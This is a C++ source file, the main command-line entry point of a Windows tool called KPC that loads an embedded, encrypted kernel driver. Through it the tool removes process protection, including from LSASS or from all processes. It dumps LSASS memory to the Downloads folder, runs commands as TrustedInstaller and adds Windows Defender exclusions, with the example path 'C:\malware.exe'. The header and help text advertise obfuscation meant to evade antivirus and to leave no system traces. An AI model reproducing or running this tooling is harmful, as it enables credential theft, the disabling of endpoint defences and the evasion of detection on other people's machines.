/*******************************************************************************
				██  ██ ██████  ████ 
				██ ██  ██  ██ ██    
				████   ██████ ██    
				██ ██  ██     ██    
				██  ██ ██      ████ 

  KPC - Kernel Process Control
  Advanced Windows Process Protection and Memory Dumping Tool
  Features Dynamic Kernel Driver Loading with Automatic Cleanup
  Achieves TrustedInstaller-level access bypassing Windows security restrictions

  -----------------------------------------------------------------------------
  Author : Marek Wesołowski
  Email  : marek@wesolowski.eu.org
  Phone  : +48 607 440 283 (Tel/WhatsApp)
  Date   : 04-09-2025

  -----------------------------------------------------------------------------
  License:
    KPC Custom License 1.0
    - Free for personal, non-commercial and academic use
    - A commercial license is required for business, enterprise or
      revenue-generating activities
    - Redistribution of source code allowed only with this header intact
    - The XOR decryption key for embedded drivers is not provided

  -----------------------------------------------------------------------------
DISCLAIMER:
    This software operates at Windows kernel level with elevated privileges.
    While designed to be safe, conflicts with antivirus software may cause
    system instability or BSOD. For optimal operation, add kpc.exe to your
    security software's exclusion list for both files and processes.
    
    The tool employs advanced anti-analysis techniques including XOR-based 
    string obfuscation, dynamic API loading, and runtime decryption to prevent
    static detection. All critical elements are reconstructed in memory only
    when needed, ensuring minimal security solution interference.
    
    Use responsibly. Author assumes no liability for system conflicts or misuse.

*******************************************************************************/

#include "common.h"
#include "Controller.h"
#include <string_view>
#include <charconv>
#include <signal.h>

// ======================= Forward Declarations =======================
void PrintUsage(std::wstring_view prog) noexcept;
std::optional<DWORD> ParsePid(std::wstring_view pidStr) noexcept;
bool IsNumeric(std::wstring_view str) noexcept;
bool IsHelpFlag(std::wstring_view arg) noexcept;
void CleanupDriver() noexcept;

// ======================= Global Variables =======================
volatile bool g_interrupted = false;
std::unique_ptr<Controller> g_controller = nullptr;

// ======================= Signal Handler for Ctrl+C =======================
void SignalHandler(int signal)
{
    if (signal == SIGINT && !g_interrupted)
    {
        g_interrupted = true;
        std::wcout << OBFINFO(L"\n[!] Ctrl+C detected - emergency cleanup...") << std::endl;
        
        if (g_controller)
        {
            try
            {
                g_controller->StopDriverService();
                std::wcout << OBFSUCCESS(L"[+] Emergency cleanup completed") << std::endl;
            }
            catch (...)
            {
                std::wcout << OBFERR(L"[-] Emergency cleanup failed") << std::endl;
            }
        }
        
        ExitProcess(130);
    }
}

// ======================= Main Application Entry Point =======================
int wmain(int argc, wchar_t* argv[])
{
    // Set signal handler for graceful cleanup on Ctrl+C
    signal(SIGINT, SignalHandler);
    
    // Display usage information if no arguments provided
    if (argc < 2)
    {
        PrintUsage(argv[0]);
        return 1;
    }

    // Check for help flags and display usage
    std::wstring_view firstArg = argv[1];
    if (IsHelpFlag(firstArg))
    {
        PrintUsage(argv[0]);
        return 0;
    }

    // Initialize main controller (atomic operations - no automatic driver loading)
    g_controller = std::make_unique<Controller>();
    std::wstring_view command = firstArg;

    try
    {
        // ======================= Memory Dumping Commands =======================
        if (command == OBFPATH(L"dump"))
        {
            if (argc < 3)
            {
                ERROR(OBFERR(L"Missing PID/process name argument for dump command").c_str());
                return 1;
            }

            std::wstring_view target = argv[2];
            std::wstring outputPath;

            // Handle optional output path argument
            if (argc >= 4)
                outputPath = argv[3];
            else
            {
                // Default to user's Downloads folder using obfuscated shell API
                wchar_t* downloadsPath;
                if (SHGetKnownFolderPath(FOLDERID_Downloads, 0, NULL, &downloadsPath) == S_OK)
                {
                    outputPath = downloadsPath;
                    outputPath += OBFPATH(L"\\");
                    CoTaskMemFree(downloadsPath);
                }
                else
                {
                    // Fallback to current directory if Downloads folder unavailable
                    outputPath = OBFPATH(L".\\");
                }
            }

            // Handle numeric PID input
            if (IsNumeric(target))
            {
                auto pid = ParsePid(target);
                if (!pid)
                {
                    ERROR(OBFERR(L"Invalid PID format: %s").c_str(), target.data());
                    return 1;
                }
                return g_controller->DumpProcess(pid.value(), outputPath) ? 0 : 2;
            }
            // Handle process name input
            else
            {
                std::wstring processName(target);
                return g_controller->DumpProcessByName(processName, outputPath) ? 0 : 2;
            }
        }
        
        // ======================= Process Information Commands =======================
        else if (command == OBFPATH(L"list"))
        {
            return g_controller->ListProtectedProcesses() ? 0 : 2;
        }
        
        else if (command == OBFPATH(L"get"))
        {
            if (argc < 3)
            {
                ERROR(OBFERR(L"Missing PID/process name argument for protection query").c_str());
                return 1;
            }

            std::wstring_view target = argv[2];
            
            // Handle numeric PID input
            if (IsNumeric(target))
            {
                auto pid = ParsePid(target);
                if (!pid)
                {
                    ERROR(OBFERR(L"Invalid PID format: %s").c_str(), target.data());
                    return 1;
                }
                return g_controller->GetProcessProtection(pid.value()) ? 0 : 2;
            }
            // Handle process name input
            else
            {
                std::wstring processName(target);
                return g_controller->GetProcessProtectionByName(processName) ? 0 : 2;
            }
        }
        
        else if (command == OBFPATH(L"info"))
        {
            if (argc < 3)
            {
                ERROR(OBFERR(L"Missing PID/process name argument for detailed information").c_str());
                return 1;
            }

            std::wstring_view target = argv[2];
            
            DWORD targetPid = 0;
            std::wstring targetProcessName;
            bool protectionResult = false;
            
            // Handle numeric PID input
            if (IsNumeric(target))
            {
                auto pid = ParsePid(target);
                if (!pid)
                {
                    ERROR(OBFERR(L"Invalid PID format: %s").c_str(), target.data());
                    return 1;
                }
                targetPid = pid.value();
                targetProcessName = Utils::GetProcessName(targetPid);
                protectionResult = g_controller->GetProcessProtection(targetPid);
            }
            // Handle process name with resolution
            else
            {
                targetProcessName = std::wstring(target);
                auto match = g_controller->ResolveNameWithoutDriver(targetProcessName);
                if (match)
                {
                    targetPid = match->Pid;
                    targetProcessName = match->ProcessName;
                    protectionResult = g_controller->GetProcessProtection(targetPid);
                }
                else
                {
                    return 2;
                }
            }
            
            // Enhanced dumpability analysis for detailed information
            if (protectionResult && targetPid != 0)
            {
                auto dumpability = Utils::CanDumpProcess(targetPid, targetProcessName);
                
                if (dumpability.CanDump)
                {
                    SUCCESS(OBFSUCCESS(L"Process is dumpable: %s").c_str(), dumpability.Reason.c_str());
                }
                else
                {
                    ERROR(OBFERR(L"Process is NOT dumpable: %s").c_str(), dumpability.Reason.c_str());
                }
            }
            
            return protectionResult ? 0 : 2;
        }
        
        // ======================= Process Protection Commands =======================
        else if (command == OBFPATH(L"set") || command == OBFPATH(L"protect"))
        {
            if (argc < 5)
            {
                ERROR(OBFERR(L"Missing arguments: <PID/process_name> <PP|PPL> <SIGNER_TYPE>").c_str());
                return 1;
            }

            std::wstring_view target = argv[2];
            std::wstring level = argv[3];
            std::wstring signer = argv[4];

            bool result = false;
            
            // Handle numeric PID input
            if (IsNumeric(target))
            {
                auto pid = ParsePid(target);
                if (!pid)
                {
                    ERROR(OBFERR(L"Invalid PID format: %s").c_str(), target.data());
                    return 1;
                }
                
                // Use appropriate method based on command type
                result = (command == OBFPATH(L"set")) ?
                    g_controller->SetProcessProtection(pid.value(), level, signer) :
                    g_controller->ProtectProcess(pid.value(), level, signer);
            }
            // Handle process name input
            else
            {
                std::wstring processName(target);
                
                result = (command == OBFPATH(L"set")) ?
                    g_controller->SetProcessProtectionByName(processName, level, signer) :
                    g_controller->ProtectProcessByName(processName, level, signer);
            }

            return result ? 0 : 2;
        }
        
        else if (command == OBFPATH(L"unprotect"))
        {
            if (argc < 3)
            {
                ERROR(OBFERR(L"Missing PID/process name argument for unprotection").c_str());
                return 1;
            }

            std::wstring_view target = argv[2];
            
            // Special "all" command for mass unprotection
            if (target == OBFPATH(L"all"))
            {
                return g_controller->UnprotectAllProcesses() ? 0 : 2;
            }
            
            // Handle comma-separated list for batch processing
            std::wstring targetStr(target);
            if (targetStr.find(L',') != std::wstring::npos)
            {
                std::vector<std::wstring> targets;
                std::wstring current;
                
                // Parse comma-separated targets
                for (wchar_t ch : targetStr)
                {
                    if (ch == L',')
                    {
                        if (!current.empty())
                        {
                            targets.push_back(current);
                            current.clear();
                        }
                    }
                    else if (ch != L' ' && ch != L'\t')  // Skip whitespace
                    {
                        current += ch;
                    }
                }
                
                // Add final target if present
                if (!current.empty())
                    targets.push_back(current);
                
                return g_controller->UnprotectMultipleProcesses(targets) ? 0 : 2;
            }
            
            // Handle single target (PID or process name)
            if (IsNumeric(target))
            {
                auto pid = ParsePid(target);
                if (!pid)
                {
                    ERROR(OBFERR(L"Invalid PID format: %s").c_str(), target.data());
                    return 1;
                }
                return g_controller->UnprotectProcess(pid.value()) ? 0 : 2;
            }
            else
            {
                std::wstring processName(target);
                return g_controller->UnprotectProcessByName(processName) ? 0 : 2;
            }
        }
        
        // ======================= System Integration Commands =======================
        else if (command == OBFPATH(L"trusted"))
        {
            if (argc < 3)
            {
                ERROR(OBFERR(L"Missing command argument for elevated execution").c_str());
                return 1;
            }

            // Reconstruct full command line from arguments
            std::wstring fullCommand;
            for (int i = 2; i < argc; i++)
            {
                if (i > 2) fullCommand += L" ";
                fullCommand += argv[i];
            }

            return g_controller->RunAsTrustedInstaller(fullCommand) ? 0 : 2;
        }
        
        else if (command == OBFPATH(L"install-context"))
        {
            return g_controller->AddContextMenuEntries() ? 0 : 1;
        }
        
        else if (command == OBFPATH(L"add-exclusion"))
		{
			if (argc >= 3) {
				std::wstring filePath = argv[2];
				return g_controller->AddToDefenderExclusions(filePath) ? 0 : 1;
			} else {
				return g_controller->AddToDefenderExclusions() ? 0 : 1;
			}
		}
		
		else if (command == OBFPATH(L"remove-exclusion"))
		{
			if (argc >= 3) {
				std::wstring filePath = argv[2];
				return g_controller->RemoveFromDefenderExclusions(filePath) ? 0 : 1;
			} else {
				return g_controller->RemoveFromDefenderExclusions() ? 0 : 1;
			}
		}
        
        // ======================= Unknown Command =======================
        else
        {
            ERROR(OBFERR(L"Unknown command: %s").c_str(), command.data());
            PrintUsage(argv[0]);
            return 1;
        }
    }
    catch (const std::exception& e)
    {
        // Handle standard C++ exceptions
        std::string msg = e.what();
        std::wstring wmsg(msg.begin(), msg.end());
        ERROR(OBFERR(L"Exception occurred: %s").c_str(), wmsg.c_str());
        CleanupDriver();
        return 3;
    }
    catch (...)
    {
        // Handle unknown exceptions
        ERROR(OBFERR(L"Unknown exception occurred during execution").c_str());
        CleanupDriver();
        return 3;
    }

    // Normal cleanup on successful completion (no-op due to atomic operations)
    CleanupDriver();
    return 0;
}

// ======================= Application Cleanup =======================
void CleanupDriver() noexcept
{
    // Note: With atomic operations, each command cleans up after itself
    // This function is maintained for compatibility but performs minimal work
    if (g_controller)
    {
        // Optional: Force cleanup any remaining driver instances
        g_controller->StopDriverService();
    }
}

// ======================= Complete Usage Information Display =======================
void PrintUsage(std::wstring_view prog) noexcept
{
    std::wcout << L"\n";
    std::wcout << OBFINFO(L"====================================================================================\n");
    std::wcout << OBFINFO(L"              	.: Marek Wesolowski :.   WESMAR - 2025\n");
	std::wcout << OBFINFO(L"                   	          kpc.exe v1.0.1\n");
    std::wcout << OBFINFO(L"                         +48 607-440-283, marek@wesolowski.eu.org\n");
    std::wcout << OBFINFO(L"                   	   KPC - Kernel Process Control\n");
    std::wcout << OBFINFO(L"      		Advanced Windows Process Protection and Memory Dumping Tool\n");
    std::wcout << OBFINFO(L"           Features Dynamic Kernel Driver Loading with Automatic Cleanup\n");
    std::wcout << OBFINFO(L"====================================================================================\n\n");
    
    std::wcout << OBFINFO(L"Usage: ") << prog << OBFINFO(L" <command> [arguments]\n\n");
    
    // ======================= Memory Dumping Commands (Priority #1) =======================
    std::wcout << OBFINFO(L"=== Memory Dumping Commands ===\n");
    std::wcout << OBFINFO(L"  dump <PID|process_name> [path]            - Create comprehensive memory dump\n");
    std::wcout << OBFINFO(L"  default path is the Downloads folder      -  simple: 'kpc lsass dump'\n");
	std::wcout << OBFINFO(L"  MsMpEng dump only works with Defender disabled (otherwise Ctrl+C)\n\n");
    
    // ======================= Process Information Commands =======================
    std::wcout << OBFINFO(L"=== Process Information Commands ===\n");
    std::wcout << OBFINFO(L"  list                              - List all protected processes with color coding\n");
    std::wcout << OBFINFO(L"  get <PID|process_name>            - Get protection status of specific process\n");
    std::wcout << OBFINFO(L"  info <PID|process_name>           - Get detailed process info including dumpability\n\n");
    
    // ======================= Process Protection Commands =======================
    std::wcout << OBFINFO(L"=== Process Protection Commands ===\n");
    std::wcout << OBFINFO(L"  set <PID|process_name> <PP|PPL> <TYPE>     - Set protection (force, ignoring current state)\n");
    std::wcout << OBFINFO(L"  protect <PID|process_name> <PP|PPL> <TYPE> - Protect unprotected process\n");
    std::wcout << OBFINFO(L"  unprotect <PID|process_name>      - Remove protection from specific process\n");
    std::wcout << OBFINFO(L"  unprotect all                     - Remove protection from ALL processes\n");
    std::wcout << OBFINFO(L"  unprotect <PID1,PID2,PID3>        - Remove protection from multiple processes\n\n");
    
    // ======================= System Integration Commands =======================
    std::wcout << OBFINFO(L"=== System Integration Commands ===\n");
    std::wcout << OBFINFO(L"  trusted <command>                 - Run command with elevated system privileges\n");
    std::wcout << OBFINFO(L"  install-context                   - Add context menu entries for right-click access\n");
	std::wcout << OBFINFO(L"  add-exclusion [path]              - Add file/folder to Windows Defender exclusions\n");
    std::wcout << OBFINFO(L"  remove-exclusion [path]           - Remove file/folder from Windows Defender exclusions\n\n");
    
    // ======================= Protection & Signer Types =======================
    std::wcout << OBFINFO(L"=== Protection Types ===\n");
    std::wcout << OBFINFO(L"  PP  - Protected Process (highest protection level)\n");
    std::wcout << OBFINFO(L"  PPL - Protected Process Light (medium protection level)\n\n");
    
    std::wcout << OBFINFO(L"=== Signer Types ===\n");
    std::wcout << OBFINFO(L"  Authenticode  - Standard code signing authority\n");
    std::wcout << OBFINFO(L"  CodeGen       - Code generation process signing\n");
    std::wcout << OBFINFO(L"  Antimalware   - Antimalware vendor signing (for security software)\n");
    std::wcout << OBFINFO(L"  Lsa           - Local Security Authority signing\n");
    std::wcout << OBFINFO(L"  Windows       - Microsoft Windows component signing\n");
    std::wcout << OBFINFO(L"  WinTcb        - Windows Trusted Computing Base signing\n");
    std::wcout << OBFINFO(L"  WinSystem     - Windows System component signing\n");
    std::wcout << OBFINFO(L"  App           - Application store signing\n\n");
    
    // ======================= Process Matching & Special Features =======================
    std::wcout << OBFINFO(L"=== Process Name Matching ===\n");
    std::wcout << OBFINFO(L"  - Exact match: 'explorer', 'notepad'\n");
    std::wcout << OBFINFO(L"  - Partial match: 'total' matches 'totalcmd64'\n");
    std::wcout << OBFINFO(L"  - Wildcards: 'total*' matches 'totalcmd64.exe'\n");
    std::wcout << OBFINFO(L"  - Case insensitive matching supported\n");
    std::wcout << OBFINFO(L"  - Multiple matches require more specific patterns\n\n");
    
    std::wcout << OBFINFO(L"=== TrustedInstaller Features ===\n");
    std::wcout << OBFINFO(L"  - Executes commands with maximum system privileges\n");
    std::wcout << OBFINFO(L"  - Supports .exe files and .lnk shortcuts automatically\n");
    std::wcout << OBFINFO(L"  - Adds convenient context menu entries\n");
    std::wcout << OBFINFO(L"  - Windows Defender exclusion management\n\n");
    
    // ======================= System Limitations =======================
    std::wcout << OBFINFO(L"=== Undumpable System Processes ===\n");
    std::wcout << OBFINFO(L"  - System (PID 4)           - Windows kernel process\n");
    std::wcout << OBFINFO(L"  - Secure System (PID 188)  - VSM/VBS protected process\n");
    std::wcout << OBFINFO(L"  - Registry (PID 232)       - Kernel registry subsystem\n");
    std::wcout << OBFINFO(L"  - Memory Compression       - Kernel memory manager\n");
    std::wcout << OBFINFO(L"  - [Unknown] processes      - Transient kernel processes\n\n");
    
    // ======================= Usage Examples =======================
    std::wcout << OBFINFO(L"=== Usage Examples ===\n");
    std::wcout << OBFINFO(L"  ") << prog << OBFINFO(L" dump lsass C:\\dumps\\          # Dump LSASS to specific folder\n");
    std::wcout << OBFINFO(L"  ") << prog << OBFINFO(L" dump 1044                     # Dump PID 1044 to Downloads folder\n");
    std::wcout << OBFINFO(L"  ") << prog << OBFINFO(L" list                          # Show all protected processes\n");
    std::wcout << OBFINFO(L"  ") << prog << OBFINFO(L" info lsass                    # Detailed info with dumpability analysis\n");
    std::wcout << OBFINFO(L"  ") << prog << OBFINFO(L" protect 1044 PPL Antimalware  # Protect process with PPL-Antimalware\n");
    std::wcout << OBFINFO(L"  ") << prog << OBFINFO(L" set 5678 PP Windows           # Force set PP-Windows protection\n");
    std::wcout << OBFINFO(L"  ") << prog << OBFINFO(L" unprotect lsass               # Remove protection from LSASS\n");
    std::wcout << OBFINFO(L"  ") << prog << OBFINFO(L" unprotect 1,2,3,lsass         # Batch unprotect multiple targets\n");
    std::wcout << OBFINFO(L"  ") << prog << OBFINFO(L" trusted cmd.exe /c whoami     # Run command as TrustedInstaller\n");
    std::wcout << OBFINFO(L"  ") << prog << OBFINFO(L" trusted \"C:\\app.exe\" --arg    # Run application with arguments\n");
    std::wcout << OBFINFO(L"  ") << prog << OBFINFO(L" install-context               # Add right-click menu entries\n");
    std::wcout << OBFINFO(L"  ") << prog << OBFINFO(L" add-exclusion                 # Add current program to exclusions\n");
	std::wcout << OBFINFO(L"  ") << prog << OBFINFO(L" add-exclusion C:\\malware.exe   # Add specific file to exclusions\n");
	std::wcout << OBFINFO(L"  ") << prog << OBFINFO(L" add-exclusion C:\\temp\\        # Add folder to exclusions\n\n");
    
    // ======================= Technical Features =======================
    std::wcout << OBFINFO(L"=== Technical Features ===\n");
    std::wcout << OBFINFO(L"  - Dynamic kernel driver loading (no permanent installation)\n");
    std::wcout << OBFINFO(L"  - Embedded encrypted driver with steganographic protection\n");
    std::wcout << OBFINFO(L"  - Automatic privilege escalation for memory dumping\n");
    std::wcout << OBFINFO(L"  - Complete cleanup on exit (no system traces)\n");
    std::wcout << OBFINFO(L"  - Advanced process pattern matching\n");
    std::wcout << OBFINFO(L"  - Color-coded process protection visualization\n\n");
    
    // ======================= Security Notice =======================
    std::wcout << OBFINFO(L"=== Security Notice ===\n");
    std::wcout << OBFINFO(L"  This tool uses advanced kernel manipulation techniques.\n");
    std::wcout << OBFINFO(L"  Administrator privileges are required for all operations.\n");
    std::wcout << OBFINFO(L"  The embedded driver is loaded temporarily and cleaned up automatically.\n");
    std::wcout << OBFINFO(L"  No permanent system modifications are made.\n\n");
    
    std::wcout << OBFINFO(L"====================================================================================\n");
    
    // Donation information
    std::wcout << L"\n";
    std::wcout << OBFINFO(L" Enjoying this tool? A small donation is greatly appreciated:\n");
    std::wcout << OBFINFO(L" PayPal: paypal.me/ext1		Revolut: revolut.me/marekb92\n");
    std::wcout << L"\n";
}

// ======================= Helper Functions =======================
std::optional<DWORD> ParsePid(std::wstring_view pidStr) noexcept
{
    if (pidStr.empty()) return std::nullopt;

    // Convert wide string to narrow string for robust parsing
    std::string narrowStr;
    narrowStr.reserve(pidStr.size());
    
    for (wchar_t wc : pidStr)
    {
        if (wc > 127) return std::nullopt; // Non-ASCII character
        narrowStr.push_back(static_cast<char>(wc));
    }

    // Parse using std::from_chars for robust numeric conversion
    DWORD result = 0;
    auto [ptr, ec] = std::from_chars(narrowStr.data(), 
                                     narrowStr.data() + narrowStr.size(), 
                                     result);
    
    return (ec == std::errc{} && ptr == narrowStr.data() + narrowStr.size()) ? 
           std::make_optional(result) : std::nullopt;
}

bool IsNumeric(std::wstring_view str) noexcept
{
    if (str.empty()) return false;
    
    // Check if all characters are numeric digits
    for (wchar_t ch : str)
    {
        if (ch < L'0' || ch > L'9')
            return false;
    }
    
    return true;
}

bool IsHelpFlag(std::wstring_view arg) noexcept
{
    // Windows style help flags
    if (arg == OBFPATH(L"/?") || arg == OBFPATH(L"/help") || arg == OBFPATH(L"/h"))
        return true;
    
    // Unix/Linux style help flags  
    if (arg == OBFPATH(L"-?") || arg == OBFPATH(L"-help") || arg == OBFPATH(L"-h"))
        return true;
    
    // GNU style help flags
    if (arg == OBFPATH(L"--help") || arg == OBFPATH(L"--h"))
        return true;
    
    // Simple help command
    if (arg == OBFPATH(L"help") || arg == OBFPATH(L"?"))
        return true;
    
    return false;
}